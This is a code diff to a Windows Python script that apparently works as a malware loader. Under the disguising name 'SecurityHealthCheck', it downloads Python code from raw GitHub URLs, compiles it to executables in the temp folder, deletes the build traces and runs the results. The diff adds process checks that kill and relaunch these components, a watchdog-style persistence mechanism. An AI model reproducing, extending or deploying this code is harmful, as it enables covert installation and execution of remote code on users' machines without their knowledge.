@@ -9,6 +9,7 @@ import win32api
 import win32con
 import win32event
 import win32clipboard
+import psutil
 
 def create_mutex(mutex_name):
     try:
@@ -20,6 +21,25 @@ def create_mutex(mutex_name):
     except Exception as e:
         print(f"Failed to create mutex: {e}")
         return False
+
+def check_process_running(process_names):
+    try:
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] in process_names:
+                return True
+        return False
+    except Exception as e:
+        print(f"Error checking running processes: {e}")
+        return False
+
+def kill_running_processes(process_names):
+    try:
+        for proc in psutil.process_iter(['pid', 'name']):
+            if proc.info['name'] in process_names:
+                proc.kill()
+                print(f"Killed process: {proc.info['name']} (PID: {proc.info['pid']})")
+    except Exception as e:
+        print(f"Error killing processes: {e}")
 
 if os.name == "nt":
     mutex_name = "SecurityHealthCheck"
@@ -119,27 +139,34 @@ def main_run():
         ("https://raw.githubusercontent.com/247msn/96737693845/refs/heads/main/watchdog2", "SecurityHealthCheck.py"),
     ]
 
-    temp_dir = os.getenv('TEMP')
-    python_files = []
-    for url, filename in urls_and_filenames:
-        code = fetch_python_code(url)
-        if code:
-            py_file_path = write_python_file(code, filename)
-            if py_file_path:
-                python_files.append(py_file_path)
+    filenames = [filename for _, filename in urls_and_filenames]
+    
+    # Check if all processes are running
+    if not check_process_running(filenames):
+        # Kill all running instances
+        kill_running_processes(filenames)
 
-    exe_files = []
-    for py_file_path in python_files:
-        exe_file_path = compile_python_to_exe(py_file_path)
-        if exe_file_path:
-            exe_files.append(exe_file_path)
+        temp_dir = os.getenv('TEMP')
+        python_files = []
+        for url, filename in urls_and_filenames:
+            code = fetch_python_code(url)
+            if code:
+                py_file_path = write_python_file(code, filename)
+                if py_file_path:
+                    python_files.append(py_file_path)
 
-    for py_file_path in python_files:
-        dist_folder = os.path.join(temp_dir, "dist")
-        build_folder = os.path.join(temp_dir, "build")
-        clean_up(py_file_path, dist_folder, build_folder)
+        exe_files = []
+        for py_file_path in python_files:
+            exe_file_path = compile_python_to_exe(py_file_path)
+            if exe_file_path:
+                exe_files.append(exe_file_path)
 
-    for exe_file_path in exe_files:
-        execute_exe_file(exe_file_path)
+        for py_file_path in python_files:
+            dist_folder = os.path.join(temp_dir, "dist")
+            build_folder = os.path.join(temp_dir, "build")
+            clean_up(py_file_path, dist_folder, build_folder)
+
+        for exe_file_path in exe_files:
+            execute_exe_file(exe_file_path)
 
 main_run()
